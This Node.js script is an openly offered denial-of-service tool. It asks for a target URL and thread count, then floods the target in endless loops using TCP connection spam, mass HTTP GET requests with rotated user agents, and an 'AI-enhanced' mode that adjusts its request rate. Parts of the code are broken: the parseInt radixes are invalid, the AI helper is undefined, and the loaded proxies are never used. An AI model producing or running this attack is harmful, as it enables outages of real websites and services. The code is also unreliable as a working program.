import chalk from 'chalk'; // For colored console output
import http from 'http'; // For making HTTP requests
import fs from 'fs'; // For reading files
import net from 'net'; // For creating TCP connections
import { EventEmitter } from 'events'; // For handling events
import { createInterface } from 'readline'; // For reading input from the console
import { isMainThread, Worker, workerData } from 'worker_threads'; // For multi-threading support
import puppeteer from 'puppeteer-extra'; // Puppeteer for browser automation
import StealthPlugin from 'puppeteer-extra-plugin-stealth'; // Stealth plugin to avoid detection

// Configuring maximum event listeners to avoid warnings
EventEmitter.defaultMaxListeners = 0;

// Configuration settings for the script
const config = {
    MAX_RAM_PERCENTAGE: 50, // Maximum RAM usage percentage
    TIMEOUT_MS: 1000000, // Timeout for requests in milliseconds
    INITIAL_CONCURRENT_REQUESTS: 500, // Initial number of concurrent requests to send
    MAX_CONCURRENT_REQUESTS: 10000, // Maximum number of concurrent requests allowed
    RETRY_LIMIT: 5, // Number of times to retry a request on failure
    INITIAL_RETRY_DELAY: 100, // Initial delay before retrying a request (in milliseconds)
    BACKOFF_FACTOR: 2, // Factor to increase the delay for successive retries
    RANDOM_DELAY_MIN: 100, // Minimum random delay between requests (in milliseconds)
    RANDOM_DELAY_MAX: 1000, // Maximum random delay between requests (in milliseconds)
};

// Global variables to hold state
let workers = [], 
    proxies = [], 
    userAgents = [], 
    totalSuccess = 0, 
    totalFailed = 0, 
    totalResponseTime = 0, 
    target = {}; 

// Function to log messages with a timestamp
function log(message) {
    const currentTime = new Date().toISOString(); // Get the current time in ISO format
    console.log(chalk.green(`[${currentTime}] ${message}`)); // Log the message with green color
}

// Function to read proxy servers from a specified file
const loadProxies = (filePath) => {
    try {
        const fileContent = fs.readFileSync(filePath, 'utf-8'); // Read file contents
        proxies = fileContent.split('\n').filter(Boolean); // Split by new line and filter out empty lines
        log(`Loaded ${proxies.length} proxies.`); // Log the number of proxies loaded
    } catch (error) {
        console.error('Failed to load proxies:', error.message); // Log any errors
        process.exit(1); // Exit the process on error
    }
};

// Function to read user agents from a specified file
const loadUserAgents = (filePath) => {
    try {
        const fileContent = fs.readFileSync(filePath, 'utf-8'); // Read file contents
        userAgents = fileContent.split('\n').filter(Boolean); // Split and filter
        log(`Loaded ${userAgents.length} user agents.`); // Log the number of user agents loaded
    } catch (error) {
        console.error('Failed to load user agents:', error.message); // Log errors
        process.exit(1); // Exit on error
    }
};

// Function to get a random proxy from the proxy list
const getRandomProxy = () => {
    return proxies[Math.floor(Math.random() * proxies.length)]; // Randomly select a proxy
};

// Function to get random header values, including User-Agent
const getRandomHeaderValues = () => {
    return {
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)], // Random User-Agent
    };
};

// Function for making HTTP requests with retries
const requestPromise = async (urlObj, retryCount) => {
    return new Promise((resolve) => {
        const startTime = Date.now(); // Record the start time for response time tracking
        const proxy = getRandomProxy(); // Select a random proxy from the list
        const headers = getRandomHeaderValues(); // Get random header values (like User-Agent)

        // Set up the request options
        const options = {
            hostname: urlObj.hostname,
            port: urlObj.port || 80, // Default to port 80 if not specified
            path: urlObj.pathname + urlObj.search, // Full path for the request
            method: 'GET', // HTTP method
            headers: headers,
            timeout: config.TIMEOUT_MS, // Timeout from the configuration
        };

        // Make the actual HTTP request
        const req = http.request(options, (res) => {
            totalSuccess++; // Increment successful request count
            res.on('data', () => { }); // Consume data to avoid memory leaks
            res.on('end', () => {
                const responseTime = Date.now() - startTime; // Calculate response time
                log(`Response time: ${responseTime}ms`); // Log the response time
                resolve(); // Resolve the promise indicating the request has completed
            });
        });

        // Handle errors that occur during the request
        req.on('error', async (error) => {
            totalFailed++; // Increment failed request count
            log('Request error: ' + error.message); // Log the error message
            if (retryCount > 0) { // Check if we can retry
                await new Promise(r => setTimeout(r, config.INITIAL_RETRY_DELAY)); // Wait before retrying
                resolve(await requestPromise(urlObj, retryCount - 1)); // Retry the request
            } else {
                resolve(); // Resolve without retrying if limit reached
            }
        });

        req.end(); // End the request
    });
};

// Method V1: TCP SYN attack
const makeRequestV1 = async (url, numRequests) => {
    const urlObj = new URL(url); // Parse the URL
    const ports = [80, 443]; // Define ports to use (HTTP and HTTPS)

    log(`Starting TCP SYN attack on ${url}...`); // Log the start of the attack
    while (true) { // Infinite loop for continuous requests
        const requests = Array.from({ length: numRequests }, () => {
            const port = ports[Math.floor(Math.random() * ports.length)]; // Randomly select a port
            const options = {
                host: urlObj.hostname, // Hostname from the URL
                port: port, // Selected port
                method: 'CONNECT', // Method for TCP SYN
                path: `${urlObj.hostname}:${port}`, // Path for the request
                timeout: config.TIMEOUT_MS, // Timeout from the configuration
            };
            return new Promise((resolve) => {
                const req = net.createConnection(options, () => {
                    totalSuccess++; // Increment success count
                    req.end(); // End the request
                    resolve(); // Resolve the promise
                });
                req.on('error', () => {
                    totalFailed++; // Increment failure count
                    resolve(); // Resolve promise on error
                });
                req.setTimeout(config.TIMEOUT_MS, () => {
                    req.destroy(); // Destroy the connection if it times out
                    totalFailed++; // Increment failure count
                    resolve(); // Resolve promise on timeout
                });
            });
        });
        await Promise.all(requests); // Wait for all requests to complete
        log(`Success: ${totalSuccess}, Failures: ${totalFailed}`); // Log success and failure counts
        await new Promise((r) => setTimeout(r, Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN) + config.RANDOM_DELAY_MIN)); // Random delay between iterations
    }
};

// Method V2: Simultaneous HTTP requests
const executeRequestV2 = async (url, numRequests) => {
    const urlObj = new URL(url); // Parse the URL
    const ports = [80, 443]; // Define ports to use
    log(`Initiating simultaneous HTTP requests on ${url}...`); // Log the start of the attack
    while (true) { // Infinite loop for continuous requests
        const requests = Array.from({ length: numRequests }, () => {
            return new Promise((resolve) => {
                const port = ports[Math.floor(Math.random() * ports.length)]; // Randomly select a port
                const options = {
                    hostname: urlObj.hostname, // Hostname from the URL
                    port: port, // Selected port
                    path: urlObj.pathname + urlObj.search, // Path for the request
                    method: 'GET', // HTTP method
                    headers: getRandomHeaderValues(), // Get random header values
                    timeout: config.TIMEOUT_MS, // Timeout from the configuration
                };
                const req = http.request(options, (res) => {
                    res.on('data', (chunk) => { }); // Consume response data
                    res.on('end', () => {
                        totalSuccess++; // Increment success count
                        resolve(); // Resolve promise
                    });
                });
                req.on('error', () => {
                    totalFailed++; // Increment failure count
                    resolve(); // Resolve promise on error
                });
                req.end(); // End the request
            });
        });
        await Promise.all(requests); // Wait for all requests to complete
        log(`Success: ${totalSuccess}, Failures: ${totalFailed}`); // Log success and failure counts
        await new Promise((r) => setTimeout(r, Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN) + config.RANDOM_DELAY_MIN)); // Random delay between iterations
    }
};

// Method V3: AI-enhanced requests
const makeRequestV3 = async (url) => {
    const urlObj = new URL(url); // Parse the URL
    target.host = urlObj.hostname; 
    target.origin = urlObj.origin; 
    target.path = urlObj.pathname; 
    const requestConnection = http.request(target, { timeout: config.TIMEOUT_MS }); 
    let currentRate = config.INITIAL_CONCURRENT_REQUESTS; 
    try { 
        log('Starting AI-enhanced attack...'); 
        while (true) { // Run indefinitely
            const requests = Array.from({ length: currentRate }, () => requestPromise(requestConnection, config.RETRY_LIMIT)); 
            await Promise.all(requests); 
            log(`Success: ${totalSuccess}, Failures: ${totalFailed}`); 
            currentRate = simpleAI.adjustRequestRate(totalSuccess, totalFailed); 
            const randomDelay = Math.floor(Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN + 1)) + config.RANDOM_DELAY_MIN; 
            await new Promise(resolve => setTimeout(resolve, randomDelay)); 
        } 
    } catch (error) { 
        log(`Error: ${error.message}`); 
    } finally { 
        requestConnection.close(); 
    } 
};

// Main execution logic
if (isMainThread) { 
    const rl = createInterface({ input: process.stdin, output: process.stdout }); // Create an interface for reading input

    const promptUser = () => { 
        return new Promise(resolve => { 
            rl.question('Enter the target URL: ', (url) => { 
                rl.question('Enter the duration (seconds): ', (duration) => { 
                    rl.question('Enter the number of threads: ', (threads) => { 
                        rl.question('Enter the path for proxy file: ', (proxyFile) => { 
                            rl.question('Enter the path for user agent file: ', (userAgentFile) => { 
                                rl.question('Select method (V1, V2, or V3): ', (method) => { 
                                    rl.close(); // Close the input interface
                                    resolve({ url, duration, threads, proxyFile, userAgentFile, method }); 
                                }); 
                            }); 
                        }); 
                    }); 
                }); 
            }); 
        }); 
    };

    promptUser().then(async ({ url, duration, threads, proxyFile, userAgentFile, method }) => { 
        loadProxies(proxyFile); 
        loadUserAgents(userAgentFile); 
        const numRequests = parseInt(threads, 6000); 
        const attackDuration = parseInt(duration, 1000); 

        if (isNaN(attackDuration) || isNaN(numRequests) || numRequests <= 0) {
            log('Invalid arguments.');
            process.exit(1);
        }

        for (let i = 0; i < numRequests; i++) { 
            const worker = new Worker(new URL(import.meta.url), { 
                workerData: { url, method } 
            }); 
            workers.push(worker); 
        }

        process.stdin.resume(); 
        process.on('SIGINT', () => { 
            log('Exiting script...'); 
            process.exit(); 
        }); 
    }); 
} else { 
    const { url, method } = workerData; 
    try { 
        if (method === 'V3') {
            await makeRequestV3(url); 
        } else if (method === 'V1') {
            await makeRequestV1(url, config.INITIAL_CONCURRENT_REQUESTS); 
        } else if (method === 'V2') {
            await executeRequestV2(url, config.INITIAL_CONCURRENT_REQUESTS); 
        }
    } catch (error) { 
        log('Worker encountered an error: ' + error.message); 
    } 
}
